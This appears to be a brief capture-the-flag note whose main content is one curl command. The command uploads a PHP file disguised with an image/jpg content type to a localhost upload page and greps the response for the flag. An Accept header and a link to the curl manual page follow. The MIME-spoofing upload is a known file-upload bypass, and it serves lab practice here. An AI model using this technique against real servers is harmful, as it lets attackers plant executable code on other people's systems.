
curl -X POST -F "uploaded=@file.php;type=image/jpg" -F Upload=upload "http://localhost:8080/index.php?page=upload" | grep "The flag is :"





Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

resource : https://curl.se/docs/manpage.html#-F